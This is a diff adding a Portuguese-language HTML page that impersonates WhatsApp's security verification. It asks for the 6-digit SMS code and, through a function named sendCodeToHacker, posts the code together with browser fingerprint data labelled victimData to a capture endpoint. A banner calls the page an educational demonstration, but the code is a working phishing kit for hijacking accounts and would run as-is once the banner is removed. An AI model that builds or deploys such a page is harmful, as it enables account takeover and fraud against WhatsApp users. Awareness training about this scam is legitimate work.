@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança WhatsApp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            min-height: 100vh; display: flex; align-items: center; 
+            justify-content: center; padding: 20px; 
+        }
+        .container { 
+            background: white; border-radius: 15px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 30px; 
+            max-width: 400px; width: 100%; 
+        }
+        .whatsapp-header { 
+            background: #25D366; color: white; padding: 20px; 
+            border-radius: 10px; text-align: center; 
+            margin: -30px -30px 20px -30px; 
+        }
+        .message { 
+            background: #e8f4fd; border: 1px solid #25D366; 
+            border-radius: 10px; padding: 15px; margin: 15px 0; 
+            text-align: center; 
+        }
+        .code-input { 
+            display: flex; gap: 8px; justify-content: center; 
+            margin: 20px 0; 
+        }
+        .code-digit { 
+            width: 45px; height: 55px; font-size: 1.4em; 
+            text-align: center; border: 2px solid #25D366; 
+            border-radius: 8px; background: #f8f9fa; font-weight: bold; 
+        }
+        .btn { 
+            background: #25D366; color: white; border: none; 
+            padding: 15px; border-radius: 8px; font-size: 1.1em; 
+            cursor: pointer; transition: all 0.3s ease; font-weight: bold; 
+            width: 100%; margin: 10px 0; 
+        }
+        .btn:hover { background: #128C7E; }
+        .loading { display: none; text-align: center; color: #25D366; margin: 10px 0; }
+        .demo-warning { 
+            background: #fff3cd; border: 2px solid #ffc107; 
+            color: #856404; padding: 12px; border-radius: 8px; 
+            margin: 15px 0; font-size: 0.9em; text-align: center; 
+        }
+        .success-message { 
+            background: #d4edda; border: 2px solid #28a745; 
+            color: #155724; padding: 12px; border-radius: 8px; 
+            margin: 15px 0; display: none; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="whatsapp-header">
+            <h1>WhatsApp</h1>
+            <p>Verificação de Segurança</p>
+        </div>
+
+        <div class="message">
+            <strong>Digite o código de 6 dígitos</strong>
+            <p style="font-size: 0.9em; margin-top: 5px; color: #666;">
+                Enviamos um código para o seu número via SMS
+            </p>
+        </div>
+
+        <div class="code-input">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+            <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this)" onkeydown="handleBackspace(event, this)">
+        </div>
+
+        <button class="btn" onclick="sendCodeToHacker()">Verificar Código</button>
+        
+        <div class="loading" id="loading">
+            ⏳ Verificando...
+        </div>
+
+        <div class="success-message" id="successMessage">
+            ✅ Código verificado com sucesso!<br>
+            <small>Em um golpe real, o hacker já teria acesso à sua conta</small>
+        </div>
+
+        <div class="demo-warning">
+            ⚠️ DEMONSTRAÇÃO EDUCACIONAL - Não use códigos reais
+        </div>
+    </div>
+
+    <script>
+        // URL base do Render (será atualizada automaticamente)
+        const BASE_URL = window.location.origin;
+
+        function moveToNext(input) {
+            if (input.value.length === 1) {
+                const next = input.nextElementSibling;
+                if (next) next.focus();
+            }
+        }
+
+        function handleBackspace(event, input) {
+            if (event.key === 'Backspace' && input.value === '') {
+                const prev = input.previousElementSibling;
+                if (prev) prev.focus();
+            }
+        }
+
+        function getEnteredCode() {
+            const digits = document.querySelectorAll('.code-digit');
+            let code = '';
+            digits.forEach(digit => code += digit.value);
+            return code;
+        }
+
+        async function sendCodeToHacker() {
+            const code = getEnteredCode();
+            
+            if (code.length !== 6) {
+                alert('Por favor, digite um código de 6 dígitos');
+                return;
+            }
+
+            // Mostrar loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+
+            // Coletar dados da vítima
+            const victimData = {
+                code: code,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled
+            };
+
+            try {
+                const response = await fetch(`${BASE_URL}/api/capture`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(victimData)
+                });
+
+                const result = await response.json();
+                
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                
+                console.log('✅ Código enviado para o hacker:', result);
+
+            } catch (error) {
+                console.error('Erro ao enviar código:', error);
+                document.getElementById('loading').style.display = 'none';
+                alert('❌ Erro de conexão. Esta é uma demonstração local.');
+            }
+        }
+
+        // Focar no primeiro input
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('.code-digit').focus();
+        });
+    </script>
+</body>
+</html>
